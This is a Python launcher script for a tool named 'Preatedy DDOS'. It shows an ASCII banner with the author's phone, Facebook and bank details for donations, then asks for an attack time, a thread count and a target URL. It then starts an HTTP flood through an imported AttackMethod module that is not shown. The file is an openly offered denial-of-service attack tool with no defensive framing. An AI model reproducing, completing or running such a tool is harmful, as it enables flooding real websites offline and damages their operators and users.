# Created by nuvem and tsk

# Import modules
from ast import Constant
from cgitb import text
import os
import sys
import argparse
from typing import Text
from colorama import Fore

os.system("@cls & @title Preatedy DDOS BY: Nguyen Thanh Dat & @color e")

# Get the actual directory
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    # import tools.addons.winpcap
    import tools.addons.wireshark
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Không nhập được một số gói", err)
    sys.exit(1)
    

method = "HTTP"
Logo = """
'████████::'████████::'████████::::'███::::'████████:'████████:'████████::'██:::'██:
 ██.... ██: ██.... ██: ██.....::::'██ ██:::... ██..:: ██.....:: ██.... ██:. ██:'██::
 ██:::: ██: ██:::: ██: ██::::::::'██:. ██::::: ██:::: ██::::::: ██:::: ██::. ████:::
 ████████:: ████████:: ██████:::'██:::. ██:::: ██:::: ██████::: ██:::: ██:::. ██::::
 ██.....::: ██.. ██::: ██...:::: █████████:::: ██:::: ██...:::: ██:::: ██:::: ██::::
 ██:::::::: ██::. ██:: ██::::::: ██.... ██:::: ██:::: ██::::::: ██:::: ██:::: ██::::
 ██:::::::: ██#:::. ██:████████: ██:::: ██:::: ██:::: ████████: ████████::::: ██::::
..:::::::::..:::::..::........::..:::::..:::::..:::::........::........::::::..:::::
                                  </>
                     ══╦════════════════════════╦══  
             ╔═════════╩════════════════════════╩═════════╗
             ║         ADMIN: NGUYỄN THÀNH ĐẠT            ║      
             ║Support ══════════════════════════════════  ║     
             ║         Zalo:  0338368207                  ║      
             ║         Facebook: Facebook.com/Preatedy    ║
             ║════════════════════════════════════════════║
             ║                DONATE ME                   ║
             ║        Mb Bank: 82007888899999             ║
             ║        Momo: 0338368207                    ║
             ║        Tsr: 0338368207                     ║                                    
             ╚═════════╦════════════════════════╦═════════╝



"""

CBLUE2 = '\33[91m'

if __name__ == "__main__":
    # Print help
    os.system('cls' if os.name == 'nt' else 'clear')
    print(CBLUE2 + Logo + CBLUE2) 
    print("          ╚═══════════════════════════════════════════════════╝")
    time = int(input(f"{Fore.   BLUE}            @𝓟𝓻𝓮𝓪𝓣𝓮𝓭𝔂/ TIME ~>:{Fore.RESET}"))                         
    threads = int(input(f"{Fore.BLUE}            @𝓟𝓻𝓮𝓪𝓣𝓮𝓭𝔂/ THREADS ~>:{Fore.RESET}"))
    target = str(input(f"{Fore.BLUE}             @𝓟𝓻𝓮𝓪𝓣𝓮𝓭𝔂/ URL ~>:{Fore.RESET}"))
    print("          ╔═══════════════════════════════════════════════════╗")
    

    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
else:
    sys.exit(1)
